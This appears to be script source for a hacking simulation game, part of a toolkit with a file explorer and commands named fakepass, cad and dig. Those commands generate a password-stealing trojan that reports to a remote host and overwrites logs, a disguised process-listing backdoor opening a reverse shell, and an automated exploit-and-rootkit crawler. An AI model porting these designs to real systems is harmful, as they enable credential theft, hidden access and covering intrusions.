      print(colorLightBlue+currentPath+CT)
      print("[F1] help [w][a][s][d] == [^][<][v][>] [q] quit")
      print("[z] clr slct [x] select [v] paste [f] file [n] rename ")
      input = user_input("["+button_c+"] tog clrs [r] remove [b] buffit ||: ",0,1)
      print
      if input.lower == "c" then
        CLEAR = (CLEAR * (-1)) //  flipbit
        continue
      end if
      if input.lower == "q" then return "Goodbye."
      if input == "/" then
        input = input + user_input(input,0,0)
        file = action.branch(file, input)
        currentPath = file.path
        continue
      end if
      file = action.get(input, file)
      currentPath = file.path
    end while
    return 0
  end function
  /// END MAINish
  init = function(file_object)
    print(colorOrange+"Felix file explorer v 1.1 by Plu70"+CT)
    print(colorLightBlue+"-----------------------------------------"+CT)
    while file_object.name != "/"
      file_object = file_object.parent
    end while
    return felix(file_object)
  end function
  if typeof(arg1) == "shell" then return init(arg1.host_computer.File("/"))
  if typeof(arg1) == "computer" then return init(arg1.File("/"))
  if typeof(arg1) == "file" then return init(arg1)
  return init(localmachine.File("/"))
end function

command.file = function(arg1, arg2=0, arg3=0, arg4=0)
	if not arg1 or arg1 == "help" or arg1 == "-h" then return "Usage: file [/path|file_object] -- file properties information. Takes path or file_object and returns string. "+char(10)+"Usage: file [-l|-c] [/path|file_object] -- returns int lines or int chars for given file."+char(10)+"Example: (copy the command in bold)<b> tree /root Config 0 N | file </b>"+char(10)+"Advanced: file -b [/path|file_object] -- send file to BUFFER (and display file info)"
  get_lines = false
	get_chars = false
  to_buffer = false
	if arg1 == "-l" or arg1 == "-c" or arg1 == "-b" then
		if arg1 == "-l" then get_lines = true
		if arg1 == "-c" then get_chars = true
    if arg1 == "-b" then to_buffer = true
		if arg2 then arg1 = arg2 else return "file: input error"
	end if
	if typeof(arg1) == "string" then
		file = null
		file = globals.get_file(arg1)
		if not file then return "id: error: "+arg1+" not found."
		arg1 = file
	end if
	if typeof(arg1) == "file" then
    imp_status = arg1.allow_import
    if imp_status then imp_status = "Yes" else imp_status = "No"
  	file_id_info = ["name: "+arg1.name, "path: "+arg1.path, "size: "+arg1.size, "owner: "+arg1.owner, "group: "+arg1.group, "perms: "+arg1.permissions]
		if arg1.is_folder then
			file_id_info.push("type: folder")
			conts = arg1.get_folders.len + arg1.get_files.len
			file_id_info.push("subs: "+conts)
		else
			if arg1.is_binary then
				file_id_info.push("type: binary")
        file_id_info.push("import: "+imp_status)
			else
				file_id_info.push("type: ascii")
				lines = 0
				chars = 0
				if arg1.get_content then
					lines = arg1.get_content.split(char(10)).len
					chars = arg1.get_content.values.len
				end if
				file_id_info.push("lines: "+str(lines))
				file_id_info.push("chars: "+str(chars))
			end if
		end if
		if get_lines then
			if file_id_info.indexOf("type: binary") == null then return str(lines) else return "file: "+arg1.path+" is binary"
		end if
		if get_chars then
			if file_id_info.indexOf("type: binary") == null then return str(chars) else return "file: "+arg1.path+" is binary"
		end if
    print(colorGreen+"<u>==================================</u>"+CT)
    if to_buffer then
      globals.BUFFER.push(arg1)
      print("file: <b>"+arg1.name+"</b> sent to <b>BUFFER</b>")
    end if
		return format_columns(file_id_info.join(char(10)))
	end if
	return "file: unknown error"
end function
if DEBUG then print("<size=75%>loading herme5.5pk...(8.142kb)</size>")
// herme5 mail menu by Plu70

//mailLib = include_lib("/lib/libmail.so")
//colorRed = "<color=red><b>"
//colorGreen = "<color=green><b>"
//colorWhite = "<color=white><b>"
//colorGold = "<color=#CCCC00FF><b>"
//colorOrange = "<color=#FF8400FF><b>"
//colorLightBlue = "<color=#2382FFFF><b>"
//CT = "</color></b>"
// end globals
/////////////////////////

  // cobble, get_custom_object interface by Plu70
  if DEBUG then print("<size=75%>loading cobble.5pk...(6.251kb)</size>")

  //command={}
  command.cob = function(arg1,arg2,arg3=0,arg4=0)
    usage_info = "<u>Cobble || custom object || cob || meta buffer</u>"+char(10)+"Usage: cob set [key] [val] -- set custom object key to val."+char(10)+"-- returns string on success or error"+char(10)+"Usage: cob get [key] -- get value of custom object key."+char(10)+"-- returns value at key or returns null on failure"+char(10)+"-- returns @reference (pointer) if value is a function"+char(10)+"Usage: cob return -- returns the raw custom object"+char(10)+"-- pipe to command.<b>code</b> to decompile the object."+char(10)+"-- ie:<b> cob return | code</b>"+char(10)+"Usage: cob inspect -- returns decompiled custom object (same as cob return | code)."+char(10)+"Usage: cob search [val] --  search for index of val."+char(10)+"-- returns string; key or failure message."+char(10)+"Inactive: cob sign -- future ability to sign custom object."+char(10)+"-- currently returns 0 (zero)."+char(10)+"Usage: cob del [key] -- delete key and its value from custom object."+char(10)+"-- returns string on success or failure."+char(10)+"Usage: cob install [key] [val] -- install piped function (val) to command.[key]"+char(10)+"-- i.e. install functions from custom object to command list"+char(10)+"Advanced: to export the onboard dictionary to the custom object:"+char(10)+"--<b> enum -d |  | enum -e | cob set dictionary</b>"+char(10)+"Advanced: to import from the custom object to the onboard dictionary"+char(10)+"--<b> cob get [dictionary] | cerebrum -i</b>"+char(10)+"OR just use<b> cob export and cob import"+char(10)+"Advanced: cob export -- export onboard dictionary to custom object"+char(10)+"Advanced: cob import -- import from custom object dictionary to onboard dictinary"+char(10)+"N.B. this is allows you to run cerebrum once, then export/import to nested shell.launches."
    if not arg1 or arg1 == "help" or arg1 == "-h" then return usage_info

    cobble = get_custom_object
    cob = {}
    cob.set = function( key=0, val=0, nil=0, nul=0 )
      if not @key then return null
      if typeof(@key) == "function" then
        if typeof(@val) == "function" then
          cobble[@key] = @val
        else
          cobble[@key] = val
        end if
      else
        if typeof(@val) == "function" then
          cobble[key] = @val
        else
          cobble[key] = val
        end if
      end if
      if cobble.hasIndex( @key ) then return "cob: set<b> "+@key+"</b> to <b>"+@val+"</b>." else return "cob: set error."
    end function

    cob.get = function( key=0, val=0, nil=0, nul=0 )
      if cobble.hasIndex( @key ) then return cobble[@key]
      if cobble.hasIndex( key ) then return cobble[ key ]
      return "cob: key not found"
    end function

    cob.search = function ( val=0, key=0, nil=0, nul=0 )
      if cobble.indexOf( @val ) != null then
        if typeof(@val) == "function" then return cobble.indexOf( @val )
        return cobble.indexOf( val )
      else
        if cobble.indexOf( val ) != null then return cobble.indexOf( val )
        return "cob: value not found."
      end if
    end function

    cob.inspect = function( key=0, val=0, nil=0, nul=0 )
      return command.code(cobble,0,0,0)
    end function

    cob.del = function( key=0, val=0, nil=0, nul=0 )
      if typeof(@key) == "function" then
        if cobble.remove( @key ) then return "cob: removed key: <b>"+@key+"</b>." //else return "cob: key not found."
      else
        if cobble.remove( key ) then return "cob: removed key: <b>"+key+"</b>." else return "cob: key not found."
      end if
    end function

    cob.sign = function( key=0, val=0, nil=0, nul=0 )
      return cob.set( "signature" , command.code("-a", key))
    end function

    cob.install = function(key=0, val=0, nil=0, nul=0)
      g = @cob.get
      new_command = g(key)
      if typeof(@new_command) == "string" then return key +": "+ new_command + ". Install failed."
      if typeof(@new_command) == "function" then 
        command[key] = @new_command 
        return "Set command."+key+" to "+@new_command
      else 
        return "cob: install expects a function"
      end if
    end function

    if arg1 == "return" then return cobble
    if arg1 == "install" then 
      return cob.install(arg2)
    end if
    if arg1 == "set" then
      if @arg3 then
        //if @arg2 == "@clipa" then arg2 = @globals.clip_board_alpha
        //if @arg2 == "@clipb" then arg2 = @globals.clip_board_beta
        //if @arg2 == "@clipc" then arg2 = @globals.clip_board_gamma
        return cob.set( @arg2, @arg3 )
      else
        return usage_info
      end if
    end if
    if arg1 == "get" then
      if @arg2 then
        g = @cob.get
        return g( @arg2 )
        //if cobble.hasIndex( arg2 ) != null then return cobble[arg2] else return null
      else
        return usage_info
      end if
    end if
    if arg1 == "inspect" then
      return cob.inspect
    end if
    if arg1 == "sign" then return cob.sign(signature)
    if arg1 == "search" then
      if @arg2 then return cob.search( @arg2 ) else return usage_info
    end if
    if arg1 == "export" then
      cob.set("dictionary",globals.dict_a)
      return "Exported "+cobble.dictionary.len+" password(s) from onbaord dictionary to custom_object.dictionary"
    end if
    if arg1 == "import" then
      if cobble.hasIndex("dictionary") then
        globals.dict_a = cob.get("dictionary")
      else
        return "cob: dictionary not found in index. set with <b>cob export</b>"
      end if
      if typeof(globals.dict_a) == "list" and globals.dict_a.len > 0 then 
        globals.BIGBRAIN = true
        return "Imported "+globals.dict_a.len+" passwords from custom_object.dictionary to onboard dictionary." 
      else 
        return "cerebrum: invalid dictionary"+char(10)+"cob: import error"
      end if
    end if
    if arg1 == "del" then
      if @arg2 then return cob.del( @arg2 ) else return usage_info
    end if
    return usage_info
  end function
  //print(command.cob("get","get"))
  //catch = command.cob("get","get")
  //print(@catch)
  if DEBUG then print("<size=75%>loading dig.5pk...(11.760kb)</size>")

  command.fakepass = function(arg1=0, arg2=0, arg3=0, arg4=0)
      if arg1 == "help" or arg1 == "-h" then return "Usage: fakepass [opt:ip] [opt:pass] -- create passwd.src in current_path. Check src and build to /bin/passwd. PW capture malware."
      ip = arg1
      p = arg2
      if not ip then ip = """"+user_input("remote ip:> ",0,0)+"""" else ip = """"+ip+""""
      if ip == """"+""+"""" then return "aborting..."
      if not p then p = """"+user_input("remote pass:> ",1,0)+"""" else p = """"+p+""""
      if p == """"+""+"""" then return "aborting..."
      passwd = "if params.len != 1 then exit(""<b>Usage: passwd [username]</b>""+char(10)+""Example: passwd john"");print(""Changing password for user ""+params[0]+""."");pass = user_input(""New password:"", 1);catch = get_shell.host_computer.change_password(params[0], pass);if catch != 1 then;if catch then exit(catch);exit(""Error: password not modified"");end if;"
      rem_c = "localmachine=get_shell.host_computer;ip = "+ip+";pt = 22;user = ""root"";p="+p+";remote = get_shell.connect_service(ip, pt, user, p);if remote then;remote.host_computer.touch(""/root/rkit"",""rpm"");rpm=remote.host_computer.File(""/root/rkit/rpm"");if rpm then rpm.set_content(rpm.get_content+char(10)+pass+char(10)+localmachine.public_ip+char(10)+localmachine.local_ip);end if;"
      scrub = "syslog = localmachine.File(""/var/system.log"");if syslog then;localmachine.touch(""/var"",""system.bak"");sbk=localmachine.File(""/var/system.bak"");if sbk then;sbk.set_content(""No IPs Today :D"");syslog.delete;sbk.move(""/var"", ""system.log"");end if;end if;"
      final = "if catch == 1 then exit(""password modified OK"");if catch then exit(catch);print(""Error: password not modified"")"
      fp = passwd + rem_c + scrub + final
      localmachine.touch(currentPath, "passwd.src")
      source = globals.get_file("passwd.src")
      print("FakePass v 0.2, by Plu70")
      print(colorRed+"- - - - - - - - - - - - - - - - - - - - -"+CT)
      if not source then return "write error: unable to create passwd.src in "+currentPath
      source.set_content(fp)
      wait (1)
      print(source.get_content)
      print
      saved = "password.src"
      if currentPath != "/" then saved = "/password.src"
      print(colorLightBlue+"Saved to: "+colorWhite+currentPath+saved+CT)
      print(colorRed+"- - - - - - - - - - - - - - - - - - - - -"+CT+char(10))
      return 0
  end function
  command.cad = function(arg1=0, arg2=0, arg3=0, arg4=0)
      if arg1 == "help" or arg1 == "-h" then return "cad: cloak and dagger protocol."+char(10)+"Usage: cad [optional: ip ] -- or enter rshell-server ip at prompt"+char(10)+"Creates ps.src in current path. "+char(10)+"Review ps.src and build with make or makfit into /bin"+char(10)+"Remove .src, run /bin/ps once with metaxploit.so present then remove metaxploit.so"+char(10)+"The result is a hidden backdoor on the target. Use with care."
      ps = """"+"ps"+""""
      shell = """"+"5hell"+""""
      zp = """"+"0.0%"+""""
      z2 = """"+"0.3%"+""""
      z1 = """"+"0.4%"+""""
      zf = [zp,z1,z2]
      zf.shuffle
      m_path = """"+"/lib/metaxploit.so"+""""
      m = """"+"metaxploit.so"+""""
      add = arg1
      if not add then add = """"+user_input("rshell addr:> ")+"""" else add = """"+add+""""
      if add == """"+""+"""" then return "aborting..."
      rip="ps=function();zp="+zp+";z2="+z2+";z1="+z1+";zf=[zp,z1,z2];zf.shuffle;procs = get_shell.host_computer.show_procs;k_tar = "+ps+";k_tar1 = "+shell+";processes = [];processes = procs.split(char(10));for p in processes;process = p.split(char(32));process_CMD = process[4];process_MEM = process[3];process_CPU = process[2];process_ID = process[1];process_user = process[0];if process_CMD == k_tar or process_CMD == k_tar1 then;continue;else;print(format_columns(process_user + char(32) + process_ID + char(32) + process_CPU + char(32) + process_MEM + char(32) + process_CMD));end if;end for;rng = range(1120, 9982);rng.shuffle;return(format_columns(active_user+char(32)+rng.pop+char(32)+"+zp+"+char(32)+zf.pop+char(32)+"+ps+"));end function"
      // nop
      nop="meta = include_lib("+m_path+");if not meta then include_lib("+m+");if not meta then exit(ps);meta.rshell_client("+add+",1222,"+ps+");exit(ps)"
      header = char(10)+"// Cloak and Dagger"+char(10)
      cd = (header+char(10)+rip+char(10)+nop)
      localmachine.touch(currentPath, "ps.src")
      source = globals.get_file("ps.src")
      print("Cloak and Dagger Protocol v 0.4, by Plu70")
      print(colorRed+"- - - - - - - - - - - - - - - - - - - - -"+CT)
      if source then
        source.set_content(cd)
        wait(1)
        out = source.get_content
        print(out)
        print
          print(colorLightBlue+"Saved to: "+colorWhite+currentPath+"/ps.src"+CT)
      else
        print("write failed"+char(10))
      end if
      print(colorRed+"- - - - - - - - - - - - - - - - - - - - -"+CT+char(10))
      return 0
  end function
  // command.dig = function(arg1, arg2, arg3=0, arg4=0)
  // 	if not arg1 or arg1 == "help" or arg1 == "-h" then return "Usage: dig [ip] [opt:port] -- upload a netcrawler to deep scan a network. "+char(10)+"port may be 0 or blank (dig [ip]) for standard use (targets router)."+char(10)+"crawler attempts to scrub logs but this may need to be done manually"+char(10)+"Advanced: clipb @B 1 | dig  (where BUFFER[1] contained a shell) -- dig that shell"+char(10)+"other methods may be used to pipe shells. eg zap | dig (this is redundant as dig runs zap internally)"+char(10)+"<b>N.B. dig is not (yet) integrated with db (the databaser) please scan libs before running dig.</b>"+char(10)+"N.B. future versions will also include an all command line version (to bypass the interactive setup)"+char(10)+"<b>Important</b>: Press enter at most prompts to use defaults (recommended)."+char(10)+"When prompted for an exploit to use, select a shell exploit."+char(10)+"If you know the password you may enter it on the SECOND password prompt. It will be colored cyan."+char(10)+"If you don't know the password, DIG is useful for finding it."+char(10)+"You may customize dig, to some degree, when prompted."
  // 	// dig local vars
  // 	del_rkit = "y"
  // 	have_pass = ""
  //   id_target = function()
  //     tar_shel = null
  //     target_ip = arg1
  //     port = "router"
  //     if arg2 then port = arg2
  //     if port == "0" or not port then port = "router"
  // 		// insert dbaser code here
  //     if typeof(target_ip) == "shell" then return target_ip
  //     if not is_valid_ip(target_ip) then return "dig: invalid ip"
  //     print(colorGold+"Initiating pre-dig outer scan..."+CT)
  //     command.probe(target_ip,port)
  //     command.meta("link", "-r")
  //     tar_shel = command.zap
  //     if tar_shel and typeof(tar_shel) == "shell" and (tar_shel.host_computer.public_ip == target_ip or tar_shel.host_computer.local_ip == target_ip) then
  //       print(colorLightBlue+"dig: target accquired: "+CT+colorOrange+"["+checkUser(tar_shel)+":"+typeof(tar_shel)+"] "+CT+"<b>"+tar_shel.host_computer.public_ip+"</b>")
  //     else
  //       return "dig: unable to find a shell on the target"
  //     end if
  //     return tar_shel
  //   end function
  
  //   prepare_package = function()
  //     pay_path = user_input("full path to rkit (default: /root/rkit) "+char(10)+":> ",0,0)
  //     if pay_path == "" or pay_path == " " then pay_path = "/root/rkit"
  //     if pay_path == "" or pay_path == " " then return "aborting..."
  //     payload = localmachine.File(pay_path)
  //     if not payload then return "404: "+pay_path+" not found"
  //     localmachine.touch(payload.path, "dig.bat")
  //     dig_bat = localmachine.File(payload.path+"/dig.bat")
  //     if not dig_bat then return "write error: could not create dig.bat"
  //     dig_bat.set_content("ifconfig -l | probe -f"+char(10))
  //     print(char(10)+"Found: "+payload.path + " " + payload.size + " " + payload.permissions+char(10))
  //     print("<b>edit permissions</b>? (default: yes)")
  //     mod = user_input("[<b>0</b>] yes [1] no (q=quit)||: ",0,1)
  //     if mod != "1" then
  //       print("e.g. o+rwx g-rwx u+x (string all edits on one line separated by spaces)")
  // 			ed_in = user_input("params for [perms/chmod -r] (default:<b> o+rwx </b>, q=quit)"+char(10)+":> ")
  // 			if ed_in.lower == "q" then return "aborting..."
  // 			if ed_in == "" then ed_in = ["o+rwx"] else ed_in = ed_in.split(" ")
  //       for ed in ed_in
  //         command.perms("-r", ed, payload.path)
  //       end for
  //     end if
  // 		if mod.lower == "q" then return "aborting..."
  // 		print
  // 		print("Would you like to edit dig.bat before uploading? (default: no)")
  // 		edit_bat = user_input("[<b>0</b>] no [1] yes (q=quit)"+char(10)+"||: ",0,1)
  // 		if edit_bat == "1" then
  // 			bat_path = payload.path + "/dig.bat"
  // 			print(colorGold+"Editing "+bat_path+char(10)+"Please use caution. Abort with @@ on a new line.")
  // 			command.scribus(bat_path)
  // 			dig_bat.set_content(dig_bat.get_content+char(10))
  // 		end if
  // 		print(char(10)+"<b>Payload Ready: "+payload.path + " " + payload.size + " " + payload.permissions+"</b>"+char(10))
  //     return payload // (package)
  //   end function
  
  //   upload_package = function(package) // (payload)
  //     tar = id_target
  //     if typeof(tar) == "string" then return tar
  //     command.clipb(tar)
  //     print("Expanding filesystem: search for a vulnerable entry point...")
  //     command.tree("@clipb","/",0,"N")
  //     dest_folder = user_input("destination folder (default: /home/guest) "+char(10)+":> ")
  // 		del_rkit = user_input("Delete the rkit once uploaded? [Y/n]"+char(10)+"||: ",0,1)
  // 		if dest_folder == "" or dest_folder == " " then dest_folder = "/home/guest"
  // 		dig_bat = localmachine.File(package.path+"/dig.bat")
  // 		if del_rkit.lower != "n" then
  // 			dig_bat.set_content(dig_bat.get_content+"echo <b>deleting rkit</b>"+char(10)+"rm -r "+dest_folder+"/rkit"+char(10))
  // 		end if
  // 		have_pass = user_input(colorCyan+"enter a password for dig to use (leave blank for cerebrum or type:<b> -f brutus </b> :to force brutus without cerebrum.)"+CT+char(10)+":> ")
  // 		if have_pass == "-f brutus" then
  // 			dig_bat.set_content(dig_bat.get_content+"echo <b>Getting root/covering tracks...</b>"+char(10)+"brutus | rclean"+char(10))
  // 		else
  // 			if have_pass != "" and have_pass != " " then
  // 				dig_bat.set_content(dig_bat.get_content+"echo <b>Getting root/covering tracks...</b>"+char(10)+"psudo -s "+have_pass+" | rclean"+char(10))
  // 			else
  // 				dig_bat.set_content(dig_bat.get_content+"echo <b>Getting root...</b> | cerebrum"+char(10))
  // 				dig_bat.set_content(dig_bat.get_content+"echo <b>Covering tracks...</b>"+char(10)+"brutus | rclean"+char(10))
  // 			end if
  // 		end if
  // 		print(colorGold+"<u>=======uploading rkit package=======</u>")
  // 	  if typeof(tar) == "shell" then
  // 	  	print(shell.scp(package.path, dest_folder, tar))
  // 			print("Locking down localhost")
  // 			command.perms("lock","all")
  // 	    hold = globals.shell
  // 	    globals.shell = tar
  // 	    globals.localmachine = shell.host_computer
  // 	    dig_bat = localmachine.File(dest_folder+"/rkit/dig.bat")
  // 	    if not dig_bat then
  // 	    	print("I/O error...")
  // 	      globals.shell = hold
  // 	      globals.localmachine = shell.host_computer
  // 	      return "dig: upload failed"
  // 	    end if
  //       print(colorGold+"Digging network..."+CT+char(10))
  //       command.run(dest_folder+"/rkit/5hell", "do 1 -f dig.bat")
  //       globals.shell = hold
  //       globals.localmachine = shell.host_computer
  //       return "dig: complete. remember to lock down permissions! (ie type: lock)"
  //     else
  //       return "dig: failed. remember to lock down permissions! (ie type: lock)"
  //     end if
  //     return 0
  //   end function
  
  //   deploy_package = function()
  //     print(colorGold+"<u>------DIG-v-0.5.3------</u>"+CT+char(10)+"Follow defaults at prompts for <u>standard</u> use. (ie press [enter] at prompts)")
  //     return upload_package(prepare_package)
  //   end function
  //   // ifconfig -p | probe -f
  //   // cerebrum
  //   // rm -r /home/guest/rkit
  //   // brutus | rclean
  //   catch = deploy_package
  //   return catch
  // end function
  command.dig = function(arg1,arg2=0,arg3=0,arg4=0)
      t = arg1
      p = arg2
      if not arg1 or arg1 == "help" or arg1 == "-h" then return "<b>DIG v 2.0 Netcrawler</b>"+char(10)+"Usage: dig [ip] [port] -- auto-infiltrate a target"+char(10)+"-- scans ports on target"+char(10)+"-- infiltrates via shell"+char(10)+"-- uploads rkit and runs 5hell on the target"+char(10)+"-- gains root and wipes the log"+char(10)+"-- performs other user defined tasks"+char(10)+"Note: edit /root/rkit/dib.bat to customize behavior"+char(10)+"<b>Note:</b> supplying <b>--edit</b> as an argument will open dig.bat in scribus"+char(10)+"-- you may add/remove commands to be executed by dig here"+char(10)+"-- if <b>--edit</b> is the only argument dig will exit after editing the batch file."+char(10)+"<b>Advanced</b>: Adding a call to the dig command in dig.bat allows daisy chaining."+char(10)+"-- e.g. <b> rnip 1 | dig </b>"
      print(colorGold+"<u>------DIG-v-1.0.1------</u>"+CT+char(10))
      // find the root kit     
      kit = command.tree("/","rkit",1,"N")
      if not kit then return "rkit not found"
      pe = kit.permissions.values
      r = 0
      w = 0
      x = 0
      if pe[-1] == "x" then x = 1
      if pe[-2] == "w" then w = 1
      if pe[-3] == "r" then r = 1
      // edit dig.bat if necessary
      bat_file = localmachine.File(kit.path+"/dig.bat")
      if not bat_file then 
          command.poke(kit.path+"/dig.bat", "ifconfig -p | probe -f"+char(10)+"cob import"+char(10)+"brutus | rclean")
          bat_file = localmachine.File(kit.path+"/dig.bat")
          if not bat_file then return "dig: unable to find or create dig.bat, aborting."
      end if
      if arg1 == "--edit" or arg2 == "--edit" or arg3 == "--edit" or arg4 == "--edit" then 
          print("Editing the batch file: "+bat_file.path)
          command.scribus(bat_file)
          if arg1 == "--edit" then return 1
      end if	
      // verify that we're ready to go
      print("Checking dictionary...")
      if not BIGBRAIN then 
          tabs = localmachine.File("/root/tables/tp")
          if tabs then 
              command.cerebrum("-i",tabs.path)
          else 
              command.cerebrum
          end if
      end if
      command.cob("export")
      // portmap target
      command.probe(t,p)
      // if not in database, scan target
      if command.meta("link","-r") then
          command.db("-r")
          if command.meta("link","-r") then
              return "dig: database error!"
          end if
      end if
      // if shell exploit, exploit target
      mem = ""
      val = ""
      for x in globals.XPLOITS
          y = x.split(" ")
          z = y[-1]
          if z == "shell" then 
              mem = y[0]
              val = y[1]
          end if
      end for
      dig_this = null
      dig_this = command.zap(mem,val,0)
      if typeof(dig_this) != "shell" then return "dig: failed to obtain shell on target."
      // upload rkit (mind permissions)
      
      command.perms("-r","o+rwx", kit.path)
      globals.shell.scp(kit.path, "/home/guest", dig_this)
      // command.perms("-r","o-rwx","/root/rkit")
      pe = ""
      if not r then pe = pe + "r"
      if not w then pe = pe + "w"
      if not x then pe = pe + "x"
      if pe != "" then command.perms("-r","o-"+pe, kit.path)
      // run 5hell on target with params:
      // -- cob import | brutus
      // -- other user defined params
      dig_this.launch("/home/guest/rkit/5hell", "do 1 -f /home/guest/rkit/dig.bat")
      // rclean and exit
      // repeat if necessary
      end function
